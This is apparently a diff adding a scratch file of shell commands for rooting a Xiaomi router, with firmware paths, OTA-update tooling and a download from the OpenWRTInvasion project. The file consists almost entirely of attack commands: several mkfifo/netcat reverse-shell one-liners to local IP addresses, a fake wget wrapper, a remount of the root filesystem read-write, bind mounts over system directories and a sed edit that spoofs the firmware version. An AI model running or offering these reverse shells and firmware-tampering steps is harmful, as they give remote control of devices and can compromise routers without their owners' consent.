@@ -1,0 +1,33 @@
+mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 192.168.31.82 9001 >/tmp/p
+
+mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 192.168.31.82 9001 >/tmp/p
+
+find . -name "*squashfs*"
+
+
+echo "echo \"\$@\";wget \"\$@\"" > wget
+
+./wget http://github.com/acecilia/OpenWRTInvasion/blob/master/sshd
+
+/usr/sbin/otapredownload
+chmod +x /tmp/otapredownload; /tmp/otapredownload
+sed -i 's/2.27.61/2.25.61/g' xiaoqiang_version
+chmod +x /tmp/wget; /tmp/wget cucu2
+cat /tmp/wgetlog
+export PATH="/tmp:$PATH"
+
+mount -o remount,rw /dev/root /
+mount -v | grep "^/" | awk '{print "\nPartition identifier: " $1  "\n Mountpoint: "  $3}'
+mount --bind /tmp/xiaoqiang /usr/share/xiaoqiang
+
+lua /usr/sbin/checkupgrade.lua "2.28.131" "release" "cdfadd55-4089-4aaa-a86a-ebcdd8659c67"
+
+/tmp/messages
+
+cat /tmp/messages
+
+tail -f /tmp/messages | grep predownload-ota
+
+((export file="/tmp/a"; export port="4444";rm -rf $file; mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 192.168.0.23 $port >$file)&)
+((export file="/tmp/b"; export port="4450";rm -rf $file; mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 192.168.0.23 $port >$file)&)
+
